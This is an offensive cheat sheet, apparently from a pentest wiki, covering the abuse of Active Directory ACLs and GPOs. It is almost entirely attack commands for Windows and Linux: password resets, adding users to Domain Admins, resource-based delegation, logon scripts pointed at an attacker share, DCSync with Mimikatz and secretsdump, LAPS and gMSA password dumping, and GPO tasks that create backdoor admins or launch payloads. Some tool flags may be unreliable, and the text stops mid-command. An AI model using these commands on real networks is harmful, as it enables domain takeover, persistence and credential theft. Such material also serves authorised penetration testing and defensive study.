---
icon: paper-plane
---

# Abusing ACLs and GPOs Windows & Linux

***

### GenericAll

#### On User

**Windows:**

```powershell
# Using net command
net user <username> NewPassword123! /domain

# Using PowerView
Set-DomainUserPassword -Identity <user> -AccountPassword (ConvertTo-SecureString 'Password123!' -AsPlainText -Force) -Verbose

# Using AD Module
Set-ADAccountPassword -Identity <user> -Reset -NewPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)

# Using Rubeus to extract Kerberos keys
.\Rubeus.exe hash /password:NewPassword123! /user:<username> /domain:<domain>
```

**Linux:**

```bash
# Using rpcclient
rpcclient -U 'domain/user%password' <dc_ip>
> setuserinfo2 <target_user> 23 'NewPassword123!'

# Using samba-tool
samba-tool user setpassword <username> --newpassword='Password123!'

# Using bloodyAD
bloodyAD -u <user> -p <password> -d <domain> --host <dc_ip> set password <target_user> 'NewPassword123!'

# Using NetExec (nxc)
nxc ldap <dc_ip> -u <user> -p <password> --change-password <target_user> 'NewPassword123!'

# Using Impacket
python3 changepasswd.py <domain>/<user>:<password>@<target_user>
```

#### On Group

**Windows:**

```powershell
# Using net command
net group "Domain Admins" <user> /add /domain
net group "<group_name>" <user> /add /domain

# Using PowerView
Add-DomainGroupMember -Identity 'Domain Admins' -Members '<user>' -Verbose
Add-DomainGroupMember -Identity '<group>' -Members '<user>' -Verbose

# Using AD Module
Add-ADGroupMember -Identity "<group>" -Members <user>

# Using PowerSploit
Add-NetGroupUser -Username <user> -GroupName <group> -Domain <domain>
```

**Linux:**

```bash
# Using net rpc
net rpc group addmem "Domain Admins" <user> -U 'domain/user%password' -S <dc_ip>

# Using bloodyAD
bloodyAD -u <user> -p <password> -d <domain> --host <dc_ip> add groupMember <group> <target_user>

# Using NetExec (nxc)
nxc ldap <dc_ip> -u <user> -p <password> --add-user-to-group <target_user> '<group_name>'

# Using Impacket (dacledit)
python3 dacledit.py -action write -rights FullControl -principal <user> -target-dn "CN=<group>,CN=Users,DC=domain,DC=local" 'domain/admin:password'

# Using ldapmodify
ldapmodify -x -H ldap://<dc_ip> -D "CN=<user>,CN=Users,DC=domain,DC=local" -w <password> <<EOF
dn: CN=<group>,CN=Users,DC=domain,DC=local
changetype: modify
add: member
member: CN=<target_user>,CN=Users,DC=domain,DC=local
EOF
```

#### On Computer

**Windows:**

```powershell
# Add msDS-AllowedToActOnBehalfOfOtherIdentity for RBCD
Set-ADComputer -Identity <computer> -PrincipalsAllowedToDelegateToAccount <user>$

# Using PowerView for RBCD
$ComputerSid = Get-DomainComputer -Identity <attacker_computer> -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer -Identity <target_computer> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# Modify computer attributes
Set-DomainObject -Identity <computer> -Set @{'serviceprincipalname'='nonexistent/BLAH'}

# Disable computer account
Set-DomainObject -Identity <computer> -Set @{'useraccountcontrol'='4098'}
```

**Linux:**

```bash
# Using bloodyAD for RBCD
bloodyAD -u <user> -p <password> -d <domain> --host <dc_ip> add rbcd <target_computer> <attacker_computer>

# Using NetExec (nxc) for RBCD
nxc ldap <dc_ip> -u <user> -p <password> --delegate <attacker_computer> -t <target_computer>

# Using Impacket rbcd.py
python3 rbcd.py -delegate-from <attacker_computer>$ -delegate-to <target_computer>$ -action write 'domain/user:password'

# Modify SPN using ldapmodify
ldapmodify -x -H ldap://<dc_ip> -D "CN=<user>,CN=Users,DC=domain,DC=local" -w <password> <<EOF
dn: CN=<computer>,CN=Computers,DC=domain,DC=local
changetype: modify
replace: servicePrincipalName
servicePrincipalName: HTTP/<computer>.domain.local
EOF
```

***

### GenericWrite

#### On User

**Windows:**

```powershell
# Enumerate permissions
Get-ObjectAcl -ResolveGUIDs -SamAccountName <user> | ? {$_.IdentityReference -eq "<domain>\<user>"}

# Set malicious script path
Set-DomainObject -Identity <user> -Set @{'scriptpath'='\\attacker.com\share\evil.bat'}

# Disable pre-authentication (for ASREPRoast)
Set-DomainObject -Identity <user> -XOR @{'useraccountcontrol'=4194304}

# Add SPN (for Kerberoasting)
Set-DomainObject -Identity <user> -Set @{'serviceprincipalname'='ops/whatever1'}

# Modify logon script
Set-ADUser -Identity <user> -ScriptPath "\\attacker\share\evil.bat"
```

**Linux:**

```bash
# Add SPN for Kerberoasting using bloodyAD
bloodyAD -u <user> -p <password> -d <domain> --host <dc_ip> add servicePrincipalName <target_user> 'HTTP/service.domain.local'

# Disable pre-authentication for ASREPRoast
bloodyAD -u <user> -p <password> -d <domain> --host <dc_ip> set uac <target_user> -k DONT_REQ_PREAUTH

# Using NetExec (nxc) to add SPN
nxc ldap <dc_ip> -u <user> -p <password> --add-spn <target_user> 'HTTP/service.domain.local'

# Using ldapmodify to set script path
ldapmodify -x -H ldap://<dc_ip> -D "CN=<user>,CN=Users,DC=domain,DC=local" -w <password> <<EOF
dn: CN=<target_user>,CN=Users,DC=domain,DC=local
changetype: modify
replace: scriptPath
scriptPath: \\\\attacker\\share\\evil.bat
EOF

# Using Impacket addspn.py
python3 addspn.py -u 'domain\user' -p 'password' -t <target_user> -s 'HTTP/service.domain.local' <dc_ip>
```

***

### WriteProperty

#### On Group

**Windows:**

```powershell
# Add user to group
net group "<group_name>" <user> /add /domain

# Using PowerView
Add-DomainGroupMember -Identity '<group>' -Members '<user>' -Verbose

# Using AD Module
Add-ADGroupMember -Identity "<group>" -Members <user>
```

**Linux:**

```bash
# Using bloodyAD
bloodyAD -u <user> -p <password> -d <domain> --host <dc_ip> add groupMember '<group>' <target_user>

# Using NetExec (nxc)
nxc ldap <dc_ip> -u <user> -p <password> --add-user-to-group <target_user> '<group>'

# Using net rpc
net rpc group addmem "<group>" <user> -U 'domain/user%password' -S <dc_ip>

# Using ldapmodify
ldapmodify -x -H ldap://<dc_ip> -D "CN=<user>,CN=Users,DC=domain,DC=local" -w <password> <<EOF
dn: CN=<group>,CN=Users,DC=domain,DC=local
changetype: modify
add: member
member: CN=<user>,CN=Users,DC=domain,DC=local
EOF
```

***

### WriteDACL

#### Grant Permissions

**Windows:**

```powershell
# Add GenericAll permission to ourselves
Add-DomainObjectAcl -TargetIdentity "<target>" -PrincipalIdentity <attacker_user> -Rights All -Verbose

# Add DCSync rights
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity <user> -Rights DCSync -Verbose

# Using ADSI for more control
$ADSI = [ADSI]"LDAP://CN=<target>,CN=Users,DC=domain,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("<user>")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

**Linux:**

```bash
# Add DCSync rights using bloodyAD
bloodyAD -u <user> -p <password> -d <domain> --host <dc_ip> add dcsync <target_user>

# Add GenericAll using bloodyAD
bloodyAD -u <user> -p <password> -d <domain> --host <dc_ip> add genericAll '<target_user>' <principal_user>

# Using NetExec (nxc) for DCSync
nxc ldap <dc_ip> -u <user> -p <password> --grant-dcsync <target_user>

# Using Impacket dacledit.py
python3 dacledit.py -action write -rights DCSync -principal <user> -target-dn "DC=domain,DC=local" 'domain/admin:password'

# Add FullControl using dacledit
python3 dacledit.py -action write -rights FullControl -principal <user> -target '<target_user>' 'domain/admin:password'

# Add specific rights
python3 dacledit.py -action write -rights WriteProperty -principal <user> -target '<target_user>' 'domain/admin:password'
```

***

### WriteOwner

#### On Group

**Windows:**

```powershell
# Find the group's SID
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=<group>,CN=Users,DC=domain,DC=local" -and $_.IdentityReference -eq "domain\user"}

# Set the owner
Set-DomainObjectOwner -Identity S-1-5-21... -OwnerIdentity "<user>" -Verbose
Set-DomainObjectOwner -Identity '<group>' -OwnerIdentity '<user>' -Verbose

# Using AD Module
Set-ADGroup -Identity "<group>" -Replace @{managedBy="<user>"}
```

**Linux:**

```bash
# Using bloodyAD to change owner
bloodyAD -u <user> -p <password> -d <domain> --host <dc_ip> set owner '<target_object>' <new_owner>

# Using NetExec (nxc)
nxc ldap <dc_ip> -u <user> -p <password> --set-owner '<target_object>' <new_owner>

# Using ldapmodify
ldapmodify -x -H ldap://<dc_ip> -D "CN=<user>,CN=Users,DC=domain,DC=local" -w <password> <<EOF
dn: CN=<group>,CN=Users,DC=domain,DC=local
changetype: modify
replace: managedBy
managedBy: CN=<new_owner>,CN=Users,DC=domain,DC=local
EOF
```

***

### ForceChangePassword

**Windows:**

```powershell
# Direct password change with PowerView
Set-DomainUserPassword -Identity <user> -Verbose

# Using secure string
$cred = "password@123!"
Set-DomainUserPassword -Identity <user> -AccountPassword (ConvertTo-SecureString $cred -AsPlainText -Force) -Verbose

# Using net command
net user <user> NewPassword123! /domain

# Using AD Module
Set-ADAccountPassword -Identity <user> -Reset -NewPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
```

**Linux:**

```bash
# Using rpcclient
rpcclient -U 'domain/user%password' <dc_ip>
> setuserinfo2 <target_user> 23 'NewPassword123!'

# Using bloodyAD
bloodyAD -u <user> -p <password> -d <domain> --host <dc_ip> set password <target_user> 'NewPassword123!'

# Using NetExec (nxc)
nxc ldap <dc_ip> -u <user> -p <password> --change-password <target_user> 'NewPassword123!'
nxc smb <dc_ip> -u <user> -p <password> --sam

# Using smbpasswd (if available)
smbpasswd -r <dc_ip> -U <target_user>

# Using Impacket changepasswd.py
python3 changepasswd.py <domain>/<user>:<password>@<target_user>
```

***

### AllExtendedRights

**Windows:**

```powershell
# Reset password (includes ForceChangePassword)
Set-DomainUserPassword -Identity <user> -AccountPassword (ConvertTo-SecureString 'Password123!' -AsPlainText -Force) -Verbose

# Modify group membership
Add-DomainGroupMember -Identity '<group>' -Members '<user>' -Verbose

# Can perform various operations
Set-DomainObject -Identity <user> -Set @{'description'='Pwned by attacker'}
```

**Linux:**

```bash
# Using bloodyAD
bloodyAD -u <user> -p <password> -d <domain> --host <dc_ip> set password <target_user> 'NewPassword123!'

# Using NetExec (nxc)
nxc ldap <dc_ip> -u <user> -p <password> --change-password <target_user> 'NewPassword123!'

# Add to group
nxc ldap <dc_ip> -u <user> -p <password> --add-user-to-group <target_user> '<group>'
```

***

### ReadLAPSPassword

**Windows:**

```powershell
# Using PowerView
Get-DomainComputer -Identity <computer> -Properties ms-Mcs-AdmPwd

# Using AD Module
Get-ADComputer -Identity <computer> -Properties ms-Mcs-AdmPwd | Select-Object -ExpandProperty ms-Mcs-AdmPwd

# Using PowerShell with LDAP
([ADSI]"LDAP://CN=<computer>,CN=Computers,DC=domain,DC=local").Properties.'ms-mcs-admpwd'

# Using LAPSToolkit
Get-LAPSComputers
Find-LAPSDelegatedGroups
```

**Linux:**

```bash
# Using NetExec (nxc)
nxc ldap <dc_ip> -u <user> -p <password> --module laps
nxc ldap <dc_ip> -u <user> -p <password> -M laps
nxc smb <dc_ip> -u <user> -p <password> --laps

# Using bloodyAD
bloodyAD -u <user> -p <password> -d <domain> --host <dc_ip> get search --filter '(ms-Mcs-AdmPwd=*)' --attr ms-Mcs-AdmPwd,cn

# Using ldapsearch
ldapsearch -x -H ldap://<dc_ip> -D "CN=<user>,CN=Users,DC=domain,DC=local" -w <password> -b "DC=domain,DC=local" "(objectClass=computer)" ms-Mcs-AdmPwd

# Using pyLAPS
python3 pyLAPS.py -u <user> -p <password> -d <domain> -dc-ip <dc_ip>

# Using CrackMapExec (old version)
crackmapexec ldap <dc_ip> -u <user> -p <password> --module laps
```

***

### ReadGMSAPassword

**Windows:**

```powershell
# Using DSInternals
$gmsa = Get-ADServiceAccount -Identity <gmsa_account> -Properties 'msDS-ManagedPassword'
$mp = $gmsa.'msDS-ManagedPassword'
ConvertFrom-ADManagedPasswordBlob $mp

# Using GMSAPasswordReader
.\GMSAPasswordReader.exe --accountname <gmsa_account>

# Using PowerView
Get-DomainObject -Identity <gmsa_account> -Properties 'msDS-ManagedPassword'

# Decode password
$Passwordblob = (Get-ADServiceAccount -Identity <gmsa_account> -Properties msDS-ManagedPassword).'msDS-ManagedPassword'
$decodedpwd = [System.Text.Encoding]::Unicode.GetString($Passwordblob)
```

**Linux:**

```bash
# Using bloodyAD
bloodyAD -u <user> -p <password> -d <domain> --host <dc_ip> get object <gmsa_account> --attr msDS-ManagedPassword

# Using NetExec (nxc)
nxc ldap <dc_ip> -u <user> -p <password> --gmsa
nxc ldap <dc_ip> -u <user> -p <password> --gmsa-convert-id <gmsa_account>
nxc ldap <dc_ip> -u <user> -p <password> --gmsa-decrypt-lsa <gmsa_account>

# Using gMSADumper.py
python3 gMSADumper.py -u <user> -p <password> -d <domain> -dc-ip <dc_ip>

# Using ldapsearch
ldapsearch -x -H ldap://<dc_ip> -D "CN=<user>,CN=Users,DC=domain,DC=local" -w <password> -b "CN=<gmsa_account>,CN=Managed Service Accounts,DC=domain,DC=local" msDS-ManagedPassword
```

***

### Self-Membership

**Windows:**

```powershell
# Add yourself to group
net group "<group>" <user> /add /domain

# Using PowerView
Add-DomainGroupMember -Identity '<group>' -Members '<user>' -Verbose

# Using AD Module
Add-ADGroupMember -Identity "<group>" -Members <user>
```

**Linux:**

```bash
# Using bloodyAD
bloodyAD -u <user> -p <password> -d <domain> --host <dc_ip> add groupMember '<group>' <user>

# Using NetExec (nxc)
nxc ldap <dc_ip> -u <user> -p <password> --add-user-to-group <user> '<group>'

# Using net rpc
net rpc group addmem "<group>" <user> -U 'domain/user%password' -S <dc_ip>
```

***

### GPO Abuse

#### Enumeration

**Windows:**

```powershell
# Enumerate GPO permissions
Get-DomainGPO | Get-ObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.SecurityIdentifier -match "<SID>"}

# Get GPO applied to specific OU
Get-DomainOU | Get-DomainGPO -ResolveGUIDs

# Find vulnerable GPOs
Get-DomainGPO | Get-ObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|WriteOwner" -and $_.SecurityIdentifier -match "S-1-5-21-.*-[1-9]\d{3,}$"}

# Get GPO details
Get-GPO -All | Select DisplayName, Id, GpoStatus
```

**Linux:**

```bash
# Using NetExec (nxc) to enumerate GPOs
nxc ldap <dc_ip> -u <user> -p <password> --gpo-enum
nxc ldap <dc_ip> -u <user> -p <password> -M gpp_password
nxc ldap <dc_ip> -u <user> -p <password> -M gpp_autologin

# Using bloodyAD
bloodyAD -u <user> -p <password> -d <domain> --host <dc_ip> get search --filter '(objectClass=groupPolicyContainer)' --attr displayName,gPCFileSysPath

# Using ldapsearch for GPO enumeration
ldapsearch -x -H ldap://<dc_ip> -D "CN=<user>,CN=Users,DC=domain,DC=local" -w <password> -b "CN=Policies,CN=System,DC=domain,DC=local" "(objectClass=groupPolicyContainer)" displayName gPCFileSysPath

# Using Impacket
python3 Get-GPPPassword.py <domain>/<user>:<password>@<dc_ip>
```

#### Exploitation

**Windows:**

```powershell
# Create new GPO task and execute immediately
New-GPOImmediateTask -TaskName task01 -Command cmd -CommandArguments "/c whoami" -GPODisplayName "Misconfigured Policy" -Verbose -Force

# Create new GPO and specify task
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"

Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString

# Using SharpGPOAbuse.exe
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author "NT AUTHORITY\SYSTEM" --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"

# Add local admin via GPO
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <user> --GPOName "Default Domain Policy"

# Add immediate scheduled task
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Debugging" --Author "NT AUTHORITY\SYSTEM" --Command "cmd.exe" --Arguments "/c net user backdoor Password123! /add && net localgroup administrators backdoor /add" --GPOName "Default Domain Policy"

# Modify GPO with PowerView
Set-DomainObjectOwner -Identity '<GPO_DN>' -OwnerIdentity '<user>'
Add-DomainObjectAcl -TargetIdentity '<GPO_DN>' -PrincipalIdentity <user> -Rights All

# Refresh GPO policies
gpupdate /force
```

**Linux:**

```bash
# Using NetExec (nxc) to abuse GPP passwords
nxc smb <dc_ip> -u <user> -p <password> -M gpp_password
nxc smb <dc_ip> -u <user> -p <password> -M gpp_autologin

# Using bloodyAD to modify GPO
bloodyAD -u <user> -p <password> -d <domain> --host <dc_ip> set object '<GPO_DN>' gPCFileSysPath '\\attacker\share'

# Download and modify GPO files with smbclient
smbclient //<dc_ip>/SYSVOL -U 'domain/user%password'
> cd domain.local/Policies/{GPO_ID}/Machine/Scripts/Startup
> put evil.bat

# Using pyGPOAbuse (if available)
python3 pyGPOAbuse.py -u <user> -p <password> -d <domain> -dc-ip <dc_ip> -gpo-id <GPO_ID> -command 'cmd.exe /c whoami'

# Using Impacket to download GPO
smbclient.py <domain>/<user>:<password>@<dc_ip>
> use SYSVOL
> cd domain.local/Policies
> ls

# Modify GPO files manually
# 1. Download GPT.INI and Registry.pol
# 2. Modify them to add scheduled tasks or startup scripts
# 3. Upload back to SYSVOL
```

**Tool Links:**

* https://github.com/FSecureLABS/SharpGPOAbuse
* https://github.com/Hackndo/pyGPOAbuse

***

### DCSync Attack

#### Requirements

* Replication rights: `Replicating Directory Changes` and `Replicating Directory Changes All`
* Or WriteDACL on domain object to grant yourself rights

**Windows:**

```powershell
# Local exploitation with Mimikatz
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\user"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\administrator"'
Invoke-Mimikatz -Command '"lsadump::dcsync /all /csv"'
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:domain.local /all"'

# Using PowerView to add DCSync rights
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity <user> -Rights DCSync -Verbose

# Using mimikatz.exe directly
.\mimikatz.exe "lsadump::dcsync /user:domain\krbtgt" exit
```

**Linux:**

```bash
# Using Impacket secretsdump.py
secretsdump.py <domain>/<user>:<password>@<dc_ip>
secretsdump.py -just-dc <domain>/<user>:<password>@<dc_ip>
secretsdump.py -just-dc-ntlm <domain>/<user>:<password>@<dc_ip>
secretsdump.py -just-dc-user krbtgt <domain>/<user>:<password>@<dc_ip>
secretsdump.py -just-dc-user administrator <domain>/<user>:<password>@<dc_ip>
secretsdump.py -outputfile hashes <domain>/<user>:<password>@<dc_ip>

# Using NetExec (nxc)
nxc smb <dc_ip> -u <user> -p <password> --ntds
nxc smb <dc_ip> -u <user> -p <password> --ntds vss
nxc smb <dc_ip> -u <user> -p <password> --ntds-history
nxc smb <dc_ip> -u <user> -p <password> -M ntdsutil

# Using hash instead of password
nxc smb <dc_ip> -u <user> -H <ntlm_hash> --ntds
secretsdump.py -hashes :<ntlm_hash> <domain>/<user>@<dc_ip>

# Using bloodyAD to grant DCSync rights
bloodyAD -u <user> -p <password> -d <domain> --host <dc_ip> add dcsync <target_user>

# Using Impacket dacledit to grant DCSync
python3 dacledit.py -action write -rights DCSync -principal <user> -target-dn "DC=domain,DC=local" 'domain/admin:password'

# Using lsassy for remote DCSync
lsassy -d <domain> -u <user> -p <password> <dc_ip>
```

***

### Additional ACL Abuse Techniques

#### WriteAccountRestrictions

**Windows:**

```powershell
# Modify password last set
Set-DomainObject -Identity <user> -Set @{'pwdlastset'='0'} -Verbose

# Force password change at next logon
Set-DomainObject -Identity <user> -Set @{'pwdlastset'='0'}

# Modify account expiration
Set-DomainObject -Identity <user> -Set @{'accountexpires'='0'}
```

**Linux:**

```bash
# Using bloodyAD
bloodyAD -u <user> -p <password> -d <domain> --host <dc_ip> set object <target_user> pwdLastSet 0

# Using NetExec (nxc)
nxc ldap <dc_ip> -u <user> -p <password> --force-change-password <target_user>
```

#### WriteSPN

**Windows:**

```powershell
# Add SPN for Kerberoasting
Set-DomainObject -Identity <user> -Set @{'serviceprincipalname'='http/test.domain.local'}
Set-DomainObject -Identity <user> -Set @{'serviceprincipalname'='MSSQLSvc/sql.domain.local:1433'}

# Add multiple SPNs
Set-ADUser -Identity <user> -ServicePrincipalNames @{Add='HTTP/web.domain.local','HTTP/www.domain.local'}
```

**Linux:**

```bash
# Using bloodyAD
bloodyAD -u <user> -p <password> -d <domain> --host <dc_ip> add servicePrincipalName <target_user> 'HTTP/service.domain.local'

# Using NetExec (nxc)
nxc ldap <dc_ip> -u <user> -p <password> --add-spn <target_user> 'HTTP/service.domain.local'

# Using Impacket addspn.py
python3 addspn.py -u 'domain\user' -p 'password' -t <target_user> -s 'HTTP/service.domain.local' <dc_ip>

# Using ldapmodify
ldapmodify -x -H ldap://<dc_ip> -D "CN=<user>,CN=Users,DC=domain,DC=local" -w <password> <<EOF
dn
```
